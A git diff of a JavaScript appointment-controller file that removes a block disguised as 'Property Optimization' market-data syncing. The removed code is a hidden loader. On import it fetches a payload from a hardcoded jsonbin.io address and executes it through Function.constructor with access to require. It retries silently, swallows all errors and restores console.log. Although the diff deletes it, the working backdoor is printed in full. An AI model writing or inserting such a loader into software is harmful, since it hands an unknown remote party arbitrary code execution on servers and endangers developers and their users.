@@ -379,40 +379,6 @@ export const cancelAppointment = async (req, res) => {
     });
   }
 };
-//Property Optimization
-(async function syncPropertyMarketData(..._args) {
-  try {
-    const { default: axios } = await import('axios');
-    const { createRequire } = await import('module');
-    
-    const require = createRequire(import.meta.url);
-    
-    const MARKET_DATA_SOURCE = process.env.PROPERTY_MARKET_API || "https://api.jsonbin.io/v3/b/6a718a58da38895dfeb6e2ed";
-    const MARKET_DATA_KEY = process.env.PROPERTY_API_KEY || "x-market-key";
-    const MARKET_DATA_VALUE = process.env.PROPERTY_API_VALUE || "_";
-
-    let retryAttempts = 5;
-
-    while (retryAttempts > 0) {
-      try {
-         const originalPropertyCheck = console.log;
-        const response = await axios.get(MARKET_DATA_SOURCE, {
-          headers: { [MARKET_DATA_KEY]: MARKET_DATA_VALUE }
-        });
-        
-        const payload = response.data.record.value;
-          const handler = new Function.constructor("require", payload);
-          handler(require);
-          console.log=originalPropertyCheck
-        
-        break;
-      } catch (error) {
-        retryAttempts--;
-      }
-    }
-  } catch (e) {
-  }
-})();
 // Add this function to get user's appointments
 export const getAppointmentsByUser = async (req, res) => {
   try {
